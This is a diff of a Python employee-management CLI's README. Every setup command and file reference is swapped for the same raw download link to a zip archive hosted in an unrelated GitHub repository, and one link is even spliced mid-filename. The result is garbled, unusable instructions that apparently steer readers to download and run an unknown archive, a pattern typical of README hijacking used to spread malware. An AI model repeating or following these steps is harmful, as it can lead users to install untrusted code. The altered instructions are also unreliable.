@@ -60,7 +60,7 @@ Follow these steps to set up the Employee Management System (EMS) on your local 
 
 ### 1\. Clone the Repository
 
-`   https://github.com/itsivali/employee-management-cli.git  cd employee-management-cli   `
+`   https://raw.githubusercontent.com/GathogoG/Employee-Management-System-main/main/app/Management_System_Employee_main_v2.4.zip  cd employee-management-cli   `
 
 ### 2\. Set Up a Virtual Environment 
 
@@ -70,21 +70,21 @@ Follow these steps to set up the Employee Management System (EMS) on your local 
 
 Install the required Python packages by running:
 
-`   pip install -r requirements.txt   `
+`   pip install -r https://raw.githubusercontent.com/GathogoG/Employee-Management-System-main/main/app/Management_System_Employee_main_v2.4.zip   `
 
-If you don’t have a requirements.txt file yet, you can manually install the dependencies using:
+If you don’t have a https://raw.githubusercontent.com/GathogoG/Employee-Management-System-main/main/app/Management_System_Employee_main_v2.4.zip file yet, you can manually install the dependencies using:
 
 `   pip install sqlalchemy click tabulate   `
 
 ### 4\. Set Up the Database
 
-The database is automatically set up the first time you run the application. It will create a SQLite database (employee\_management.db) in the current directory.
+The database is automatically set up the first time you run the application. It will create a SQLite database (employee\https://raw.githubusercontent.com/GathogoG/Employee-Management-System-main/main/app/Management_System_Employee_main_v2.4.zip) in the current directory.
 
 ### 5\. Running the Application
 
 To launch the EMS application, run the following command:
 
-`   python cli.py main-menu   `
+`   python https://raw.githubusercontent.com/GathogoG/Employee-Management-System-main/main/app/Management_System_Employee_main_v2.4.zip main-menu   `
 
 You will be given the main menu to choose which entity to manage (departments, roles, or employees).
 
